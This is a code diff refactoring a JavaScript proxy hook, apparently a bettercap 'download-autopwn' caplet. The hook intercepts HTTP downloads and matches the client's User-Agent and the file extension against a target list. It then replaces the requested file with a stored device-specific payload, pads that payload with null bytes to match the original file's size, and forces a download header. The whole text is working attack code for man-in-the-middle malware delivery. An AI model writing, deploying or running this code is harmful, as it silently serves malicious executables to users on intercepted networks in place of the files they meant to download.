@@ -29,15 +29,9 @@ function onResponse(req, res) {
 	// First of all check whether the requested path might have an extension (to save cpu)
 	var requestedFileName = req.Path.replace(/.*\//g, "")
 	if ( requestedFileName.indexOf(".") != -1 ) {
-		var userAgent,
+		var userAgent = req.GetHeader("User-Agent", ""),
 		    extension,
 		    headerCount = req.Headers.length
-		// Grab User-Agent
-		for (var h = 0; h < headerCount; h++) {
-			if (req.Headers[h]["Name"] == "User-Agent") {
-				userAgent = req.Headers[h]["Value"]
-			}
-		}
 		// Iterate through targets
 		for ( var t = 0; t < Object.keys(targets).length; t++ ) {
 			// Check if User-Agent is a target
@@ -50,31 +44,29 @@ function onResponse(req, res) {
 					if ( requestedFileName.replace(/.*\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {
 						extension = targets[t]["extensions"][e]
 						// Autopwn
-						logStr = "\n" + redLine + "  Autopwning download request from " + boldRed + req.Client + reset
-						logStr += redLine
-						logStr += redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset
-						logStr += redLine
-						logStr += redLine + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
+						logStr = "\n" + redLine + "  Autopwning download request from " + boldRed + req.Client + reset + 
+						         redLine + 
+						         redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset + 
+						         redLine + 
+						         redLine + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
 						// Check requested file size
 						requestedFile = res.ReadBody()
 						requestedFileSize = requestedFile.length
 						payload = readFile("caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)
 						payloadSize = payload.length
-						logStr += redLine + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes"
-						logStr += redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"
-						logStr += redLine
+						logStr += redLine + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes" + 
+						          redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes" + redLine
 						// Append nullbytes to payload if resizing is enabled and if requested file is larger than payload
-						if ( requestedFileSize > payloadSize && env("downloadautopwn.resizepayloads") == "true" ) {
+						if ( env("downloadautopwn.resizepayloads") == "true" && requestedFileSize > payloadSize ) {
 							logStr += redLine + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."
 							sizeDifference = requestedFileSize - payloadSize
 							nullbyteString = Array(sizeDifference + 1).join(nullbyte)
 							payload += nullbyteString
 						}
 						// Set Content-Disposition header to enforce file download instead of in-browser preview
-						res.Headers[headerCount + 1] = {
-							"Name"  : "Content-Disposition",
-							"Value" : "attachment; filename=\"" + requestedFileName + "\""
-						}
+						res.SetHeader("Content-Disposition", "attachment; filename=\"" + requestedFileName + "\"")
+						// Update Content-Length header in case our payload is larger than the requested file
+						res.SetHeader("Content-Length", payload.length)
 						logStr += redLine + "  Serving your payload to " + boldRed + req.Client + reset + "...\n"
 						log(logStr)
 						res.Body = payload
